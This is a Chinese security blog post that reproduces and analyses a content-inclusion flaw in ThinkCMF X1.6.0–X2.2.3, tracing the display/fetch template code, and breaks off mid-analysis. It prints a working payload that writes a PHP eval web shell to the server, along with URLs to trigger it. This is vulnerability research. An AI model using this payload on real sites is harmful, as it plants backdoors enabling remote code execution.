<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="ShangZeng">





<title>thincmf2.2.3任意内容包含漏洞 | ShangZeng</title>



    <link rel="icon" href="/favicon.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
    "HTML-CSS": {
        preferredFont: "TeX",
        availableFonts: ["STIX","TeX"],
        linebreaks: { automatic:true },
        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
    },
    tex2jax: {
        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
        processEscapes: true,
        ignoreClass: "tex2jax_ignore|dno",
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    },
    TeX: {
        equationNumbers: { autoNumber: "AMS" },
        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
        Macros: { href: "{}" }
    },
    messageStyle: "none"
    });
</script>
<!-- 给MathJax元素添加has-jax class -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>
<!-- 通过连接CDN加载MathJax的js代码 -->
<script type="text/javascript" async
        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
</script>


    


<meta name="generator" content="Hexo 4.2.0"></head>
<body>
    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">ShangZeng&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                    <a class="menu-item" href="/friends">Friends</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>

        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">ShangZeng&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                    <a class="menu-item" href="/friends">Friends</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
        <div class="main">
            <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    document.ready(
        function () {
            tocbot.init({
                tocSelector: '.tocbot-list',
                contentSelector: '.post-content',
                headingSelector: 'h1, h2, h3, h4, h5',
                collapseDepth: 1,
                orderedList: false,
                scrollSmooth: true,
            })
        }
    )

    function expand_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 6,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "collapse_toc()");
        b.innerHTML = "Collapse all"
    }

    function collapse_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 1,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "expand_toc()");
        b.innerHTML = "Expand all"
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">thincmf2.2.3任意内容包含漏洞</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">ShangZeng</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">December 14, 2020&nbsp;&nbsp;20:16:09</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/categories/php/">php</a>
                            
                        </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>ThinkCMF X1.6.0<br>ThinkCMF X2.1.0<br>ThinkCMF X2.2.0<br>ThinkCMF X2.2.1<br>ThinkCMF X2.2.2<br>ThinkCMF X2.2.3</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ol>
<li><a href="https://github.com/shangzeng/PHP-CODE-BUG" target="_blank" rel="noopener">下载</a></li>
<li>访问<code>www.xxx.com/index.php?g=install</code>安装</li>
</ol>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h3><p>输入如下payload，写入shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;fetch&amp;templateFile&#x3D;public&#x2F;index&amp;prefix&#x3D;&#39;&#39;&amp;content&#x3D;&lt;php&gt;file_put_contents(&#39;shandianbian.php&#39;,&#39;&lt;?php @eval($_GET[cmd]) ?&gt;&#39;)&lt;&#x2F;php&gt;</span><br></pre></td></tr></table></figure>

<p>验证是否写入成功</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.thinkcmf.com&#x2F;shandianbian.php?cmd&#x3D;phpinfo();</span><br></pre></td></tr></table></figure>

<p><img src="https://www.shangzeng.club/2020/12/14/thincmf2-2-3%E4%BB%BB%E6%84%8F%E5%86%85%E5%AE%B9%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image.png" alt="image"></p>
<h3 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h3><p>文件包含刚才写入的马</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;?a&#x3D;display&amp;templateFile&#x3D;README.md</span><br><span class="line">http:&#x2F;&#x2F;www.thinkcmf.com&#x2F;?a&#x3D;display&amp;templateFile&#x3D;shandianbian.php&amp;cmd&#x3D;phpinfo();</span><br></pre></td></tr></table></figure>

<p>![image](<a href="https://www.shangzeng.club/2020/12/14/thincmf2-2-3任意内容包含漏洞/image">https://www.shangzeng.club/2020/12/14/thincmf2-2-3任意内容包含漏洞/image</a> (1).png)</p>
<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>代码结构如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">thinkcmf  根目录</span><br><span class="line">├─api                     api目录</span><br><span class="line">│  ├─demo                 演示应用api目录[可删除]</span><br><span class="line">│  │  ├─controller        控制器目录</span><br><span class="line">│  │  ├─model             模型目录</span><br><span class="line">│  │  └─ ...              更多类库目录</span><br><span class="line">├─app                     应用目录</span><br><span class="line">│  ├─demo                 演示应用目录[可删除]</span><br><span class="line">│  │  ├─controller        控制器目录</span><br><span class="line">│  │  ├─model             模型目录</span><br><span class="line">│  │  └─ ...              更多类库目录</span><br><span class="line">│  ├─ ...                 更多应用</span><br><span class="line">│  ├─app.php              应用(公共)配置文件[可选]</span><br><span class="line">│  ├─command.php          命令行工具配置文件[可选]</span><br><span class="line">│  ├─common.php           应用公共(函数)文件[可选]</span><br><span class="line">│  ├─database.php         数据库配置文件[可选]</span><br><span class="line">│  ├─tags.php             应用行为扩展定义文件[可选]</span><br><span class="line">├─data                    数据目录（可写）</span><br><span class="line">│  ├─config               动态配置目录（可写）</span><br><span class="line">│  ├─route                动态路由目录（可写）</span><br><span class="line">│  ├─runtime              应用的运行时目录（可写）</span><br><span class="line">│  └─ ...                 更多</span><br><span class="line">├─public                  WEB 部署目录（对外访问目录）</span><br><span class="line">│  ├─plugins              插件目录</span><br><span class="line">│  │  └─demo              演示插件[卸载后可删除]</span><br><span class="line">│  ├─static               官方静态资源存放目录(css,js,image)，勿放自己项目文件</span><br><span class="line">│  ├─themes               前后台主题目录</span><br><span class="line">│  │  ├─admin_simpleboot3 后台默认主题</span><br><span class="line">│  │  └─default           前台默认主题</span><br><span class="line">│  ├─upload               文件上传目录</span><br><span class="line">│  ├─api.php              API入口</span><br><span class="line">│  ├─index.php            入口文件</span><br><span class="line">│  ├─robots.txt           爬虫协议文件</span><br><span class="line">│  ├─router.php           快速测试文件</span><br><span class="line">│  └─.htaccess            apache重写文件</span><br><span class="line">├─extend                  扩展类库目录[可选]</span><br><span class="line">├─vendor                  第三方类库目录（Composer）</span><br><span class="line">│  ├─thinkphp             ThinkPHP目录</span><br><span class="line">│  └─...             </span><br><span class="line">├─composer.json           composer 定义文件</span><br><span class="line">├─LICENSE                 授权说明文件</span><br><span class="line">├─README.md               README 文件</span><br><span class="line">├─think                   命令行入口文件</span><br></pre></td></tr></table></figure>


<p>路由模块注册等等规则查看开发手册： <a href="https://www.thinkcmf.com/docs/cmfx/app.html" target="_blank" rel="noopener">thinkcmf开发手册</a></p>
<h3 id="第一种-1"><a href="#第一种-1" class="headerlink" title="第一种"></a>第一种</h3><p>首先我们需要了解thinkcmf的陆游掉配方式,其中访问后台的网址如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.thinkcmf.com&#x2F;index.php?g&#x3D;admin&amp;m&#x3D;public&amp;a&#x3D;login</span><br></pre></td></tr></table></figure>

<p>在thincmf中调用方式如下：</p>
<p>![image](<a href="https://www.shangzeng.club/2020/12/14/thincmf2-2-3任意内容包含漏洞/image">https://www.shangzeng.club/2020/12/14/thincmf2-2-3任意内容包含漏洞/image</a> (2).png)</p>
<p>而在payload中，并没有设置调用模块<code>g</code>因此调用的是默认模块，查看thinkcmf默认模块设置<code>application/Common/Conf/config.php</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 在这里进行模块注册，也可以查看已有的模块</span><br><span class="line">&#39;MODULE_ALLOW_LIST&#39;  &#x3D;&gt; array(&#39;Admin&#39;,&#39;Portal&#39;,&#39;Asset&#39;,&#39;Api&#39;,&#39;User&#39;,&#39;Wx&#39;,&#39;Comment&#39;,&#39;Qiushi&#39;,&#39;Tpl&#39;,&#39;Topic&#39;,&#39;Install&#39;,&#39;Bug&#39;,&#39;Better&#39;,&#39;Pay&#39;,&#39;Cas&#39;),</span><br><span class="line">&#39;TMPL_DETECT_THEME&#39;     &#x3D;&gt; false,       &#x2F;&#x2F; 自动侦测模板主题</span><br><span class="line">&#39;TMPL_TEMPLATE_SUFFIX&#39;  &#x3D;&gt; &#39;.html&#39;,     &#x2F;&#x2F; 默认模板文件后缀</span><br><span class="line">&#39;DEFAULT_MODULE&#39;        &#x3D;&gt;  &#39;Portal&#39;,  &#x2F;&#x2F; 默认模块</span><br><span class="line">&#39;DEFAULT_CONTROLLER&#39;    &#x3D;&gt;  &#39;Index&#39;, &#x2F;&#x2F; 默认控制器名称</span><br><span class="line">&#39;DEFAULT_ACTION&#39;        &#x3D;&gt;  &#39;index&#39;, &#x2F;&#x2F; 默认操作名称</span><br><span class="line">&#39;DEFAULT_M_LAYER&#39;       &#x3D;&gt;  &#39;Model&#39;, &#x2F;&#x2F; 默认的模型层名称</span><br><span class="line">&#39;DEFAULT_C_LAYER&#39;       &#x3D;&gt;  &#39;Controller&#39;, &#x2F;&#x2F; 默认的控制器层名称</span><br></pre></td></tr></table></figure>

<p>了解到默认控制器模块为<code>Portal</code>,模块没写就是默认的<code>index</code>，进入<code>\application\Portal\Controller\IndexController.class.php</code>查看:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">namespace Portal\Controller;</span><br><span class="line">use Common\Controller\HomebaseController; </span><br><span class="line">&#x2F;**</span><br><span class="line"> * 首页</span><br><span class="line"> *&#x2F;</span><br><span class="line">class IndexController extends HomebaseController &#123;</span><br><span class="line">	</span><br><span class="line">    &#x2F;&#x2F;首页 小夏是老猫除外最帅的男人了</span><br><span class="line">	public function index() &#123;</span><br><span class="line">    	$this-&gt;display(&quot;:index&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入父类<code>HomebaseController</code>查看<code>display</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * 加载模板和页面输出 可以返回输出内容</span><br><span class="line"> * @access public</span><br><span class="line"> * @param string $templateFile 模板文件名</span><br><span class="line"> * @param string $charset 模板输出字符集</span><br><span class="line"> * @param string $contentType 输出类型</span><br><span class="line"> * @param string $content 模板输出内容</span><br><span class="line"> * @return mixed</span><br><span class="line"> *&#x2F;</span><br><span class="line">&#x2F;&#x2F; 修复方式：public 改为 protected</span><br><span class="line">public function display($templateFile &#x3D; &#39;&#39;, $charset &#x3D; &#39;&#39;, $contentType &#x3D; &#39;&#39;, $content &#x3D; &#39;&#39;, $prefix &#x3D; &#39;&#39;) &#123;</span><br><span class="line">	parent::display($this-&gt;parseTemplate($templateFile), $charset, $contentType,$content,$prefix);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>进入父类<code>AppframeController</code>-&gt;<code>Controller</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">protected function display($templateFile&#x3D;&#39;&#39;,$charset&#x3D;&#39;&#39;,$contentType&#x3D;&#39;&#39;,$content&#x3D;&#39;&#39;,$prefix&#x3D;&#39;&#39;) &#123;</span><br><span class="line">    $this-&gt;view-&gt;display($templateFile,$charset,$contentType,$content,$prefix);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入<code>view</code>属性的<code>display</code>方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; View.class.php</span><br><span class="line">    public function</span><br><span class="line">    &#x2F;&#x2F; $templateFile 为 readme.md</span><br><span class="line">    display($templateFile&#x3D;&#39;&#39;,$charset&#x3D;&#39;&#39;,$contentType&#x3D;&#39;&#39;,$content&#x3D;&#39;&#39;,$prefix&#x3D;&#39;&#39;) &#123;</span><br><span class="line">        G(&#39;viewStartTime&#39;);</span><br><span class="line">        &#x2F;&#x2F; 视图开始标签</span><br><span class="line">        Hook::listen(&#39;view_begin&#39;,$templateFile);</span><br><span class="line">        &#x2F;&#x2F; 解析并获取模板内容</span><br><span class="line">        &#x2F;&#x2F; 跟进这里</span><br><span class="line">        $content &#x3D; $this-&gt;fetch($templateFile,$content,$prefix);</span><br><span class="line">        &#x2F;&#x2F; 输出模板内容</span><br><span class="line">        $this-&gt;render($content,$charset,$contentType);</span><br><span class="line">        &#x2F;&#x2F; 视图结束标签</span><br><span class="line">        Hook::listen(&#39;view_end&#39;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>进入<code>fetch</code>,这里将<code>$templateFile</code>内容带入数组<code>$params</code>,带入<code>Hook::listen(&#39;view_filter&#39;,$content);</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">public function fetch($templateFile&#x3D;&#39;&#39;,$content&#x3D;&#39;&#39;,$prefix&#x3D;&#39;&#39;) &#123;</span><br><span class="line">    if(empty($content)) &#123;</span><br><span class="line">        &#x2F;&#x2F; parseTemplate 自动定位模板文件</span><br><span class="line">        $templateFile   &#x3D;   $this-&gt;parseTemplate($templateFile);</span><br><span class="line">        &#x2F;&#x2F; 模板文件不存在直接返回</span><br><span class="line">        if(!is_file($templateFile)) E(L(&#39;_TEMPLATE_NOT_EXIST_&#39;).&#39;:&#39;.$templateFile);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        defined(&#39;THEME_PATH&#39;) or    define(&#39;THEME_PATH&#39;, $this-&gt;getThemePath());</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F; 页面缓存</span><br><span class="line">    ob_start();</span><br><span class="line">    ob_implicit_flush(0);</span><br><span class="line">    if(&#39;php&#39; &#x3D;&#x3D; strtolower(C(&#39;TMPL_ENGINE_TYPE&#39;))) &#123; &#x2F;&#x2F; 使用PHP原生模板</span><br><span class="line">        $_content   &#x3D;   $content;</span><br><span class="line">        &#x2F;&#x2F; 模板阵列变量分解成为独立变量</span><br><span class="line">        extract($this-&gt;tVar, EXTR_OVERWRITE);</span><br><span class="line">        &#x2F;&#x2F; 直接载入PHP模板</span><br><span class="line">        empty($_content)?include $templateFile:eval(&#39;?&gt;&#39;.$_content);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        &#x2F;&#x2F; 视图解析标签</span><br><span class="line">        $params &#x3D; array(&#39;var&#39;&#x3D;&gt;$this-&gt;tVar,&#39;file&#39;&#x3D;&gt;$templateFile,&#39;content&#39;&#x3D;&gt;$content,&#39;prefix&#39;&#x3D;&gt;$prefix);</span><br><span class="line">        Hook::listen(&#39;view_parse&#39;,$params);</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F; 获取并清空缓存</span><br><span class="line">    $content &#x3D; ob_get_clean();</span><br><span class="line">    &#x2F;&#x2F; 内容过滤标签</span><br><span class="line">    Hook::listen(&#39;view_filter&#39;,$content);</span><br><span class="line">    &#x2F;&#x2F; 输出模板文件</span><br><span class="line">    return $content;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>关于<code>Hook</code>操作，在这里属于<a href="http://document.thinkphp.cn/manual_3_2.html#behavior_extend" target="_blank" rel="noopener">行为扩展</a>，继续跟 <code>application\Common\Conf\tags.php</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">return array( &#x2F;&#x2F; 添加下面一行定义即可</span><br><span class="line">    &#39;app_init&#39; &#x3D;&gt; array(</span><br><span class="line">        &#39;Common\Behavior\InitHookBehavior&#39;,</span><br><span class="line">    ),</span><br><span class="line">    &#39;app_begin&#39; &#x3D;&gt; array(</span><br><span class="line">        &#39;Behavior\CheckLangBehavior&#39;,</span><br><span class="line">        &#39;Common\Behavior\UrldecodeGetBehavior&#39;</span><br><span class="line">    ),</span><br><span class="line">    &#39;view_filter&#39; &#x3D;&gt; array(</span><br><span class="line">        &#39;Common\Behavior\TmplStripSpaceBehavior&#39;</span><br><span class="line">    ),</span><br><span class="line">    &#39;admin_begin&#39; &#x3D;&gt; array(</span><br><span class="line">        &#39;Common\Behavior\AdminDefaultLangBehavior&#39;</span><br><span class="line">    )</span><br><span class="line">)</span><br><span class="line">;</span><br></pre></td></tr></table></figure>

<p>在这里我们也可看代码进行理解，跟进<code>Hook::listen</code>在:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">static public function listen($tag, &amp;$params&#x3D;NULL) &#123;</span><br><span class="line">    if(isset(self::$tags[$tag])) &#123;</span><br><span class="line">        if(APP_DEBUG) &#123;</span><br><span class="line">            G($tag.&#39;Start&#39;);</span><br><span class="line">            trace(&#39;[ &#39;.$tag.&#39; ] --START--&#39;,&#39;&#39;,&#39;INFO&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">        foreach (self::$tags[$tag] as $name) &#123;</span><br><span class="line">            APP_DEBUG &amp;&amp; G($name.&#39;_start&#39;);</span><br><span class="line">            &#x2F;&#x2F; exec 执行某个插件</span><br><span class="line">            $result &#x3D;   self::exec($name, $tag,$params);</span><br><span class="line">            if(APP_DEBUG)&#123;</span><br><span class="line">                G($name.&#39;_end&#39;);</span><br><span class="line">                trace(&#39;Run &#39;.$name.&#39; [ RunTime:&#39;.G($name.&#39;_start&#39;,$name.&#39;_end&#39;,6).&#39;s ]&#39;,&#39;&#39;,&#39;INFO&#39;);</span><br><span class="line">            &#125;</span><br><span class="line">            if(false &#x3D;&#x3D;&#x3D; $result) &#123;</span><br><span class="line">                &#x2F;&#x2F; 如果返回false 则中断插件执行</span><br><span class="line">                return ;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if(APP_DEBUG) &#123; &#x2F;&#x2F; 记录行为的执行日志</span><br><span class="line">            trace(&#39;[ &#39;.$tag.&#39; ] --END-- [ RunTime:&#39;.G($tag.&#39;Start&#39;,$tag.&#39;End&#39;,6).&#39;s ]&#39;,&#39;&#39;,&#39;INFO&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进<code>exec</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">static public function exec($name, $tag,&amp;$params&#x3D;NULL) &#123;</span><br><span class="line">    if(&#39;Behavior&#39; &#x3D;&#x3D; substr($name,-8) )&#123;</span><br><span class="line">        &#x2F;&#x2F; 行为扩展必须用run入口方法</span><br><span class="line">    	$class &#x3D; $name;</span><br><span class="line">        $tag    &#x3D;   &#39;run&#39;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">    	$class   &#x3D;  &quot;plugins\\&#123;$name&#125;\\&#123;$name&#125;Plugin&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;如果由 class_name 所指的类已经定义，此函数返回 true，否则返回 false。</span><br><span class="line">    if(class_exists($class))&#123; &#x2F;&#x2F;ThinkCMF NOTE 插件或者行为存在时才执行</span><br><span class="line">        &#x2F;&#x2F; 这里可以新建类</span><br><span class="line">        echo $class;</span><br><span class="line">        &#x2F;&#x2F; 这里的 $class 是按照命令空间来定义的 namespace Behavior\ParseTemplateBehavior;</span><br><span class="line">    	$addon   &#x3D; new $class();</span><br><span class="line">        &#x2F;&#x2F; 从 $class 这个类中调用 run 方法 参数 $params 就是文件包含的文件名</span><br><span class="line">    	return $addon-&gt;$tag($params);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>按照命令空间进行调用类，这里调用的就是<code>namespace Behavior\ParseTemplateBehavior;</code>这个类的run方法，参数是我们传入的文件名：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">class ParseTemplateBehavior &#123;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 行为扩展的执行入口必须是run</span><br><span class="line">    public function run(&amp;$_data)&#123;</span><br><span class="line">        $engine             &#x3D;   strtolower(C(&#39;TMPL_ENGINE_TYPE&#39;));</span><br><span class="line">        $_content           &#x3D;   empty($_data[&#39;content&#39;])?$_data[&#39;file&#39;]:$_data[&#39;content&#39;];</span><br><span class="line">        $_data[&#39;prefix&#39;]    &#x3D;   !empty($_data[&#39;prefix&#39;])?$_data[&#39;prefix&#39;]:C(&#39;TMPL_CACHE_PREFIX&#39;);</span><br><span class="line">        if(&#39;think&#39;&#x3D;&#x3D;$engine)&#123; &#x2F;&#x2F; 采用Think模板引擎</span><br><span class="line">            if((!empty($_data[&#39;content&#39;]) &amp;&amp; $this-&gt;checkContentCache($_data[&#39;content&#39;],$_data[&#39;prefix&#39;])) </span><br><span class="line">                ||  $this-&gt;checkCache($_data[&#39;file&#39;],$_data[&#39;prefix&#39;])) &#123; &#x2F;&#x2F; 缓存有效</span><br><span class="line">                &#x2F;&#x2F;载入模版缓存文件</span><br><span class="line">                Storage::load(C(&#39;CACHE_PATH&#39;).$_data[&#39;prefix&#39;].md5($_content).C(&#39;TMPL_CACHFILE_SUFFIX&#39;),$_data[&#39;var&#39;]);</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                &#x2F;&#x2F; 进入这里执行</span><br><span class="line">                $tpl &#x3D; 